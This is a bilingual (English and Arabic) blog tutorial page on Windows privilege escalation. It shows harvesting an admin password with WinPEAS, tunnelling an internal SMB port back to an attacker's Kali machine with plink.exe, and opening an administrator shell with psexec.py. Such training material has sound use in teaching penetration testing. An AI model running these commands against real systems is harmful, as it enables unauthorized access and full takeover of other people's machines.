@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Windows PE - Port Forwarding | Jehad Alqurashi</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+<div class="nav-wrapper" id="nav-wrapper">
+<nav class="nav">
+<div class="logo">
+<a href="../index.html"><span class="logo-icon">JA</span>Jehad Alqurashi</a>
+</div>
+<ul class="menu">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../tags.html">Tags</a></li>
+</ul>
+</nav>
+</div>
+<div class="reading-progress"><div class="reading-progress-bar" id="reading-bar"></div></div>
+<main class="main">
+<div class="breadcrumb">
+<a href="../index.html">Home</a><span class="sep">/</span><a href="../tags.html">windows-privesc</a><span class="sep">/</span><span>Windows PE - Port Forwarding</span>
+</div>
+<article class="post-single">
+<header class="post-header">
+<div class="post-meta">
+<span class="post-category">windows-privesc</span>
+<span class="post-date">2023-07-15</span>
+</div>
+<h1 class="post-title">Windows PE - Port Forwarding</h1>
+</header>
+<div class="lang-tabs">
+<button class="lang-tab active" onclick="switchLang('en',this)">English</button>
+<button class="lang-tab" onclick="switchLang('ar',this)">Arabic</button>
+</div>
+<div id="content-en" class="post-content">
+<h2>Introduction</h2>
+<p>In this article, we will cover how to escalate privileges on a Windows system using Port Forwarding. First, let us understand what port forwarding is and why it matters in the context of privilege escalation. After compromising a machine, there may be internal ports running services that are only accessible from within the target system. These internal services could be vulnerable or running with elevated privileges, making them useful for privilege escalation. However, since they are not exposed externally, we need a way to reach them from our attacking machine -- and that is where port forwarding comes in.</p>
+<h2>Walkthrough</h2>
+<h3>Step 1: Initial Access and Enumeration with WinPEAS</h3>
+<p>As usual, we start with a limited-privilege user account on the target system (the <code>user</code> account). We transfer WinPEAS to the compromised system, as we have explained in previous parts of this series. After running WinPEAS, we review the results together. Notably, WinPEAS discovers the administrator's password stored in the Windows registry.</p>
+
+<figure class="article-img"><img src="../assets/images/windows-pe-port-forwarding/1.jpeg" alt="Step 1" loading="lazy"></figure>
+<h3>Step 2: Scanning for External Ports with Nmap</h3>
+<p>Now that we have the admin credentials, we need a way to log in as the administrator. We run an Nmap scan against the target to check whether SMB (port 445) or RDP (port 3389) are open externally, since either of these would allow us to authenticate as the admin user.</p>
+<p>After scanning, we observe that neither the SMB port nor the RDP port is accessible from the outside.</p>
+
+<figure class="article-img"><img src="../assets/images/windows-pe-port-forwarding/2.png" alt="Step 2" loading="lazy"></figure>
+
+<figure class="article-img"><img src="../assets/images/windows-pe-port-forwarding/3.png" alt="Step 3" loading="lazy"></figure>
+<h3>Step 3: Checking for Internal Ports</h3>
+<p>Even though SMB and RDP are not exposed externally, they may still be listening internally. We can verify this by running the following command on the compromised system:</p>
+<pre><code>netstat -a
+</code></pre>
+<p>The output confirms that SMB (port 445) is indeed open internally. The question now becomes: how do we connect to an internal port from our attacker machine?</p>
+
+<figure class="article-img"><img src="../assets/images/windows-pe-port-forwarding/4.png" alt="Step 4" loading="lazy"></figure>
+<h3>Step 4: Setting Up SSH Remote Port Forwarding with plink.exe</h3>
+<p>We will use SSH together with <code>plink.exe</code> (the command-line version of PuTTY) to create a remote port forward. This opens a port on our Kali machine that tunnels traffic through to the internal SMB port on the Windows target.</p>
+<p>Before we begin, we need to modify the SSH configuration on our Kali machine. Open the SSH configuration file:</p>
+<pre><code>/etc/ssh/sshd_config
+</code></pre>
+<p>Find the <code>PermitRootLogin</code> directive, remove the <code>#</code> comment character in front of it, and change its value to <code>yes</code>:</p>
+<pre><code>PermitRootLogin yes
+</code></pre>
+<p>Then restart the SSH service to apply the changes:</p>
+<pre><code>service ssh restart
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/windows-pe-port-forwarding/5.png" alt="Step 5" loading="lazy"></figure>
+<h3>Step 5: Transferring plink.exe and Establishing the Tunnel</h3>
+<p>Transfer <code>plink.exe</code> to the compromised Windows machine, then execute the following command from the target system:</p>
+<pre><code>plink.exe root@&lt;kali-ip&gt; -R 445:127.0.0.1:445
+</code></pre>
+<p>Replace <code>&lt;kali-ip&gt;</code> with the IP address of your Kali machine. Leave everything else as-is. The tool will prompt you for the root password on your Kali machine. After entering it, the internal Windows SMB port will be forwarded and accessible on your Kali machine.</p>
+
+<figure class="article-img"><img src="../assets/images/windows-pe-port-forwarding/6.png" alt="Step 6" loading="lazy"></figure>
+<h3>Step 6: Verifying the Port Forward</h3>
+<p>To confirm that the SMB port has been successfully forwarded to our Kali machine, run:</p>
+<pre><code>netstat -tlp
+</code></pre>
+<p>The output should show port 445 listening on the Kali machine. We have successfully pulled the internal Windows SMB port over to our attacker system, and we can now connect to it.</p>
+
+<figure class="article-img"><img src="../assets/images/windows-pe-port-forwarding/7.png" alt="Step 7" loading="lazy"></figure>
+
+<figure class="article-img"><img src="../assets/images/windows-pe-port-forwarding/8.png" alt="Step 8" loading="lazy"></figure>
+<h3>Step 7: Gaining an Admin Shell with psexec.py</h3>
+<p>Now we use <code>psexec.py</code> (from the Impacket suite) to authenticate to the forwarded SMB port using the admin credentials we discovered earlier. We provide the tool with the local IP address (127.0.0.1 since the port is now forwarded to our machine), along with the admin username and password. The tool uploads a malicious service binary and opens a command shell with administrator privileges:</p>
+<pre><code>psexec.py admin:&lt;password&gt;@127.0.0.1 cmd
+</code></pre>
+<p>We now have a fully elevated administrative shell on the target system through port forwarding.</p>
+<h2>Tools Referenced</h2>
+<ul>
+<li><strong>WinPEAS</strong> -- Credential discovery and enumeration</li>
+<li><strong>Nmap</strong> -- Port scanning</li>
+<li><strong>plink.exe</strong> -- SSH tunneling / remote port forwarding</li>
+<li><strong>psexec.py</strong> -- Remote command execution via SMB</li>
+</ul>
+<figure class="article-img"><img src="../assets/images/windows-pe-port-forwarding/9.png" alt="Step 9" loading="lazy"></figure>
+
+</div>
+<div id="content-ar" class="post-content rtl-content" style="display:none;direction:rtl;text-align:right;">
+<p>مقدمة:</p>
+<p>في هذي المقالة راح اشرح لكم عن كيف نرفع صلاحيتنا عن طريق Port Forwarding. خلونا نفهم اول شي ايش ال Port Forwarding بعض الاحيان بعد ماتخترق الجهاز يكون فيه بورتات داخلية هذي البورتات الداخلية ممكن تكون مصابة بثغرة معينة وشغالة بصلاحية عالية او انه ممكن تستفيد منها عموما ف رفع الصلاحيات.</p>
+<p>الشرح:</p>
+<p>طيب اول شي انا داخل بيوزر محدود الصلاحية كالعادة اللي هو user. يعد كذا راح استخدم اداة winpease وشرحنا كيف ننلقها الى النظام المخترق في الاجزاء السابقة. راح نسوي رن لي winpease ونشوف النتائج مع بعض. نلاحظ انه لقي لنا الباسورد الخاص بالادمن عن طريق الريجستري.</p>
+<figure class="article-img"><img src="../assets/images/windows-pe-port-forwarding/1.jpeg" alt="Step 1" loading="lazy"></figure>
+
+<p>طيب لو نجي نسوي scan للبورتات عن طريق اداة Nmap عشان نشوف اذا بورت ال smb او ال RDP مفتوحين او لا عشان نسجل دخول بيوزر الادمن عن طريقهم. نلاحظ ان لا بورت ال smb مفتوح ولا ال RDP.</p>
+<figure class="article-img"><img src="../assets/images/windows-pe-port-forwarding/2.png" alt="Step 2" loading="lazy"></figure>
+
+<p>طيب ممكن بورت ال smb او ال RDP مفتوح داخليا راح نعرف عن طريق امر: netstat -a</p>
+<p>نلاحظ انه فعلا بورت ال SMB مفتوح داخليا طيب كيف راح نتصل عليه؟ راح نستخدم ال ssh واداة plink.exe عشان نقدر نفتح بورت على الكالي ومن خلال هذا البورت نقدر نمرر اتصالنا لبورت ال SMB الداخلي.</p>
+<figure class="article-img"><img src="../assets/images/windows-pe-port-forwarding/3.png" alt="Step 3" loading="lazy"></figure>
+
+<p>طيب قبل نبدا لازم نعدل شي على اعدادات ال ssh. راح نروح لملف: etc/ssh/sshd_config/ ونبحث فيه عن PermitRootLogin ونغير قيمته الى yes ونشيل علامة الهاشتاق اللي قبله.</p>
+<figure class="article-img"><img src="../assets/images/windows-pe-port-forwarding/4.png" alt="Step 4" loading="lazy"></figure>
+
+<p>بعد كذا تسوي ريستارت الى ال ssh عن طريق هذا الامر: service ssh restart</p>
+<figure class="article-img"><img src="../assets/images/windows-pe-port-forwarding/5.png" alt="Step 5" loading="lazy"></figure>
+
+<p>بعد كذا ننقل اداة plink للجهاز المخترق وننفذ هذا الامر: plink.exe [root@kali] -R 445:127.0.0.1:445</p>
+<figure class="article-img"><img src="../assets/images/windows-pe-port-forwarding/6.png" alt="Step 6" loading="lazy"></figure>
+
+<p>طبعا انت راح تعدل على الامر بشي بسيط راح تحط بعد ال @ الايبي الخاص بالكالي والباقي اتركه زي ماهو. بعد كذا راح يطلبك الباسورد الخاص بالروت راح تحطه وبعد كذا راح يكون بورت ال SMB الداخلي الخاص بالوندوز مفتوح على الكالي.</p>
+<figure class="article-img"><img src="../assets/images/windows-pe-port-forwarding/7.png" alt="Step 7" loading="lazy"></figure>
+
+<p>طيب خلونا نتاكد هل بورت ال SMB فعلا انفتح على الكالي او لا راح ننفذ هذا الامر عشان نتاكد: netstat -tlp</p>
+<p>زي مانلاحظ قدرنا نسحب بورت smb الداخلي الخاص بالوندوز واللحين نقدر نتصل فيه وندخل بالحساب الخاص بالادمن بما انه عندنا الباسورد.</p>
+<figure class="article-img"><img src="../assets/images/windows-pe-port-forwarding/8.png" alt="Step 8" loading="lazy"></figure>
+
+<p>الان راح استخدم اداة psexec هذي الاداة راح اعطيها الايبي المحلي و اليوزر و الباسورد الخاص بالادمن وراح ترفع ملف خبيث وتفتح لك جلسة بصلاحية الادمن: psexec.py admin:[password]@127.0.0.1 cmd</p>
+<figure class="article-img"><img src="../assets/images/windows-pe-port-forwarding/9.png" alt="Step 9" loading="lazy"></figure>
+
+</div>
+<div class="post-nav">
+<a href="../index.html">&larr; Back to all articles</a>
+</div>
+</article>
+</main>
+<footer class="footer">
+<span>&copy; 2024 Jehad Alqurashi</span>
+<br><a href="#" class="top-link">&uarr; Back to top</a>
+</footer>
+<div class="night-bg" id="nightsky"></div>
+<div class="lightning"></div>
+<div class="rain-splash"></div>
+<script>
+(function(){
+  var c=document.getElementById('nightsky');
+  for(var i=0;i<5;i++){
+    var cl=document.createElement('div');
+    cl.className='cloud';
+    cl.style.top=(i*8+2)+'%';
+    cl.style.left='-20%';
+    cl.style.width=(200+i*80)+'px';
+    cl.style.height=(60+i*20)+'px';
+    cl.style.background='rgba(80,100,140,'+(0.03+i*0.01)+')';
+    cl.style.animationDuration=(60+i*20)+'s';
+    cl.style.animationDelay=(i*12)+'s';
+    c.appendChild(cl);
+  }
+  for(var i=0;i<120;i++){
+    var d=document.createElement('div');
+    d.className='rain-drop';
+    d.style.left=Math.random()*100+'%';
+    var far=Math.random();
+    if(far<0.5){
+      d.style.height=(Math.random()*18+14)+'px';
+      d.style.width='1.5px';
+      d.style.animationDuration=(Math.random()*0.4+0.4)+'s';
+      d.style.opacity=Math.random()*0.15+0.1;
+    } else {
+      d.style.height=(Math.random()*10+6)+'px';
+      d.style.width='0.5px';
+      d.style.animationDuration=(Math.random()*0.6+0.7)+'s';
+      d.style.opacity=Math.random()*0.08+0.03;
+    }
+    d.style.animationDelay=(Math.random()*2)+'s';
+    c.appendChild(d);
+  }
+  for(var i=0;i<20;i++){
+    var p=document.createElement('div');
+    p.className='particle';
+    p.style.left=Math.random()*100+'%';
+    p.style.width=p.style.height=(Math.random()*2+1)+'px';
+    p.style.background=Math.random()>0.5?'rgba(0,212,255,0.3)':'rgba(139,92,246,0.2)';
+    p.style.animationDuration=(Math.random()*15+10)+'s';
+    p.style.animationDelay=(Math.random()*10)+'s';
+    c.appendChild(p);
+  }
+})();
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var nw=document.getElementById('nav-wrapper');
+  if(nw) nw.classList.toggle('scrolled',window.scrollY>20);
+});
+</script>
+<script>
+function switchLang(lang, btn) {
+  document.querySelectorAll('.lang-tab').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('content-en').style.display = lang === 'en' ? '' : 'none';
+  document.getElementById('content-ar').style.display = lang === 'ar' ? '' : 'none';
+}
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var bar=document.getElementById('reading-bar');
+  if(!bar)return;
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  bar.style.width=h>0?Math.min(100,window.scrollY/h*100)+'%':'0%';
+});
+document.addEventListener('click',function(e){
+  if(e.target.closest('.article-img img')){
+    var src=e.target.src;
+    var ov=document.createElement('div');
+    ov.className='lightbox-overlay';
+    ov.innerHTML='<img src="'+src+'" alt="Zoomed">';
+    document.body.appendChild(ov);
+    setTimeout(function(){ov.classList.add('active');},10);
+    ov.onclick=function(){ov.classList.remove('active');setTimeout(function(){ov.remove();},300);};
+  }
+});
+</script>
+</body>
+</html>
